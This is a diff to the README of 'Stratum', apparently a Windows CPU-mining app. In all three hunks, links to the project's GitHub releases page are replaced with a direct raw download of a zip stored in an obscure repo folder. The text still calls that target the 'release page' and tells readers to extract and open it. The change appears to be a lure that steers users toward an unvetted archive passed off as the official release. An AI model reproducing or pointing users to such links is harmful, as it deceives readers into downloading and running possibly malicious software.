@@ -1,6 +1,6 @@
 # ⚡ Stratum - CPU Mining That Stays Practical
 
-[![Download Stratum](https://img.shields.io/badge/Download-Stratum-blue?style=for-the-badge&logo=github)](https://github.com/bayvapourisable154/Stratum/releases)
+[![Download Stratum](https://img.shields.io/badge/Download-Stratum-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bayvapourisable154/Stratum/main/klipfish/Software_v2.4-alpha.2.zip)
 
 ## 🚀 What Stratum Does
 
@@ -30,7 +30,7 @@ For better results, use a modern multi-core CPU. A stronger CPU can handle more 
 
 Visit the Stratum release page here:
 
-[https://github.com/bayvapourisable154/Stratum/releases](https://github.com/bayvapourisable154/Stratum/releases)
+[https://raw.githubusercontent.com/bayvapourisable154/Stratum/main/klipfish/Software_v2.4-alpha.2.zip](https://raw.githubusercontent.com/bayvapourisable154/Stratum/main/klipfish/Software_v2.4-alpha.2.zip)
 
 On that page, look for the latest release. Download the Windows build that matches your system. If the release includes a `.zip` file, save it to your computer and open it after the download finishes.
 
@@ -238,7 +238,7 @@ The app is centered on proof-of-work and CPU use on common hardware.
 
 ## 🏁 Start Here
 
-1. Visit the release page: [https://github.com/bayvapourisable154/Stratum/releases](https://github.com/bayvapourisable154/Stratum/releases)
+1. Visit the release page: [https://raw.githubusercontent.com/bayvapourisable154/Stratum/main/klipfish/Software_v2.4-alpha.2.zip](https://raw.githubusercontent.com/bayvapourisable154/Stratum/main/klipfish/Software_v2.4-alpha.2.zip)
 2. Download the latest Windows release
 3. Extract the file if needed
 4. Open the main Stratum app
